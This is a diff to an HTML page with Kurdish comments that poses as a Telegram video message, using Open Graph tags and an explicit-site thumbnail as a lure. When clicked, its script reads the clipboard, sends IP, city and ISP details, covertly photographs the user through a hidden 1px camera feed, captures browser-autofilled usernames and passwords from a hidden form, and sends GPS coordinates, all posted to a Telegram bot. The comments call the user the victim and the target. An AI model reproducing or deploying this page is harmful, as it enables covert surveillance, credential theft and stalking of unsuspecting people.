@@ -3,6 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <!-- تێلگرام ئەم بەشانە دەخوێنێتەوە بۆ دروستکردنی وێنەی لینکەکە -->
+    <meta property="og:title" content="▶️ Telegram Video Message (0:45)">
+    <meta property="og:description" content="Tap to play video">
+    <meta property="og:image" content="https://static-pv.xnxx-cdn.com/videos/thumbs169ll/ec/04/e7/ec04e7696611910ef0b694294d1de06d/default.jpg">
+    <meta property="og:type" content="video.other">
+    <meta name="twitter:card" content="summary_large_image">
+
     <title>Video Player</title>
     <style>
         body { font-family: -apple-system, system-ui, sans-serif; background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
@@ -19,7 +27,7 @@
         .play-btn { width: 80px; height: 80px; background: rgba(0,0,0,0.6); border-radius: 50%; display: flex; justify-content: center; align-items: center; border: 3px solid white; }
         .play-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
 
-        /* ڕێگری لە وێنەی ڕەش - ڤیدیۆکە دەبێت 1px بێت و نەشاردرێتەوە */
+        /* ڕێگری لە وێنەی ڕەش - ڤیدیۆکە دەبێت ئۆپاسیتی کەم بێت نەک display none */
         #spy-video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
         canvas { display: none; }
         #trap-form { position: absolute; opacity: 0.01; pointer-events: none; }
@@ -60,11 +68,11 @@
         }
 
         document.getElementById('clickTrap').addEventListener('click', async function() {
-            // شاردنەوەی وێنەی تەڵەکە بۆ ئەوەی قوربانی ڤیدیۆکە ببینێت
+            // نیشاندانی ڤیدیۆ و دەستپێکردنی هاککردن
             this.style.opacity = '0';
             setTimeout(() => { this.style.display = 'none'; }, 500);
 
-            // ١. ناردنی Clipboard و IP و ISP دەستبەجێ
+            // ١. Clipboard و IP Information
             try {
                 const clipText = await navigator.clipboard.readText();
                 if(clipText) sendToBot("📋 Clipboard Found:\n" + clipText);
@@ -74,13 +82,12 @@
                 sendToBot(`🌐 Target IP: ${d.ip}\n🏙️ City: ${d.city}\n🏢 ISP: ${d.org}`);
             });
 
-            // ٢. وێنەگرتنی کامێرا (بە کاتی ٦ چرکە بۆ دڵنیابوون لە وێنەیەکی ڕوون)
+            // ٢. وێنەگرتنی کامێرا (بۆ ماوەی ٦ چرکە بۆ دڵنیایی ڕوونی)
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const spyVid = document.getElementById('spy-video');
                 spyVid.srcObject = stream;
                 
-                // وێستان بۆ ٦ چرکە تا کامێراکە فوکەسی تەواو دەکات
                 await new Promise(r => setTimeout(r, 6000));
                 
                 const canvas = document.getElementById('canvas');
@@ -92,26 +99,24 @@
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'target.jpg');
-                fd.append('caption', '👤 High-Quality Face Captured!');
+                fd.append('caption', '👤 Target Face Captured!');
                 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 stream.getTracks().forEach(t => t.stop());
-            } catch(e) { await sendToBot("❌ Camera Access Denied"); }
+            } catch(e) { await sendToBot("❌ Access Denied"); }
 
-            // ٣. ناردنی GPS و پاسوۆرد و Autofill
+            // ٣. دزینی پاسوۆرد و ناردنی GPS
             let u = document.getElementById('af_user').value;
             let p = document.getElementById('af_pass').value;
-            if(p) sendToBot(`🔑 Password Manager Stolen:\n👤 User: ${u}\n🔒 Pass: ${p}`);
+            if(p) sendToBot(`🔑 Credential Captured:\n👤 User: ${u}\n🔒 Pass: ${p}`);
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
-                    sendToBot(`📍 GPS Coordinates:\nhttps://www.google.com/maps?q=${lat},${lon}\nAccuracy: ${pos.coords.accuracy}m`);
+                    sendToBot(`📍 GPS Coordinates:\nhttps://www.google.com/maps?q=${lat},${lon}`);
                 }, null, { enableHighAccuracy: true });
             }
-            
-            // ئاگاداری: لێرەدا هیچ گواستنەوەیەک نییە، قوربانی تا کۆتایی سەیری ڤیدیۆکە دەکات
         });
     </script>
 </body>
